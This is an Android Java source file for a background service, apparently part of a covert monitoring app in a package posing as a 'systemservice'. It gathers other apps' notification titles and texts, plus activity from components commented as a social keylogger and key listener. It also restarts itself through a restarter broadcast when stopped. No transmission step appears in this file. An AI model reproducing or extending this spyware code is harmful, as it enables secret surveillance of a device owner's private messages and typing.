package com.example.systemservice;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import java.util.LinkedList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class MainService extends Service {

    private static final String TAG_BOOT_EXECUTE_SERVICE = "BOOT_BROADCAST_SERVICE";
    public LinkedList<Notifica> notifiche = new LinkedList<Notifica>();
    public LinkedList<Attivita> attivita = new LinkedList<>();
    private boolean receiversRegistered;
    private int idDispositivo = -1;

    public MainService() {
    }

    public MainService(Context applicationContext) {
        super();
        Log.i("HERE", "here I am!");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        receiversRegistered = false;
        registerReceivers();
        SharedPreferences sharedPref = this.getSharedPreferences("FILE", Context.MODE_PRIVATE);
        idDispositivo = sharedPref.getInt("idDispositivo", -1);
        Log.d("++++", String.valueOf(idDispositivo));
        Log.i("SERVICE", "NUOVO SERVICE");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //Toast.makeText(getApplicationContext(), "Service startato", Toast.LENGTH_LONG).show();
        super.onStartCommand(intent, flags, startId);
        startTimer();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i("EXIT", "ondestroy!");
        //Invio al restarter l'intent
        Intent broadcastIntent = new Intent(this, RestarterBroadcastReceiver.class);
        sendBroadcast(broadcastIntent);
        stoptimertask();
        if (receiversRegistered) {
            unregisterReceiver(notifReceiver);
            unregisterReceiver(logSocialReceiver);
            unregisterReceiver(attivitaReceiver);
        }
    }

    private Timer timer;
    private TimerTask timerTask;
    long oldTime = 0;

    public void startTimer() {
        //set a new Timer
        timer = new Timer();

        //initialize the TimerTask's job
        initializeTimerTask();

        //schedule the timer, to wake up every 1 second
        timer.schedule(timerTask, 5000, 5000); //
    }

    public void stoptimertask() {
        //stop the timer, if it's not already null
        if (timer != null) {
            timer.cancel();
            timer = null;
        }
    }

    /**
     * it sets the timer to print the counter every x seconds
     */
    private int counter = 0;

    public void initializeTimerTask() {
        timerTask = new TimerTask() {
            public void run() {
                Log.d("++++", "OOOOOOOOK parto subito");
            }
        };
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    //Receivers

    private BroadcastReceiver notifReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            //Ricevo le notifiche dal notificationReceiver
            try {
                String id = intent.getStringExtra("ID");
                String applicazione = intent.getStringExtra("Applicazione");
                String titolo = intent.getStringExtra("Titolo");
                String testo = intent.getStringExtra("Testo");
                String dateTime = intent.getStringExtra("DateTime");
                Notifica n = new Notifica(id, applicazione, titolo, testo, dateTime);
                n.setInviata(false);
                notifiche.add(n);
                Log.d("++++", n.toString());
            } catch (Exception e) {
                Log.d("Passaggio notifica: ", "Non eseguito");
            }
        }
    };

    private BroadcastReceiver logSocialReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            //Ricevo le notifiche dal notificationReceiver
            try {
                String id = "";
                String applicazione = intent.getStringExtra("Applicazione");
                String titolo = intent.getStringExtra("Titolo");
                String testo = intent.getStringExtra("Testo");
                String dateTime = intent.getStringExtra("DateTime");
                Notifica n = new Notifica(id, applicazione, titolo, testo, dateTime);
                n.setInviata(true);
                notifiche.add(n);
                Log.d("notifica inviata", n.toString());
            } catch (Exception e) {
                Log.d("Passaggio notifica", "Non eseguito");
            }
        }
    };

    private BroadcastReceiver attivitaReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            //Ricevo le attivita dal keyListener
            try {
                String applicazione = intent.getStringExtra("pack");
                String descrizione = intent.getStringExtra("descrizione");
                String dateTime = intent.getStringExtra("data");
                Attivita a = new Attivita(applicazione, descrizione, dateTime);
                attivita.add(a);
            } catch (Exception e) {
                Log.d("Passaggio notifica", "Non eseguito");
            }
        }
    };

    public void registerReceivers() {
        if (!receiversRegistered) {
            //Notifiche
            IntentFilter filter = new IntentFilter();
            filter.addAction("ricevitoreNotifiche");
            registerReceiver(notifReceiver, filter);
            //Keylogger social
            filter = new IntentFilter();
            filter.addAction("logSocialReceiver");
            registerReceiver(logSocialReceiver, filter);
            //Attivita
            filter = new IntentFilter();
            filter.addAction("attivitaReceiver");
            registerReceiver(attivitaReceiver, filter);
            //Registro una sola volta
            receiversRegistered = true;
        }
    }

}

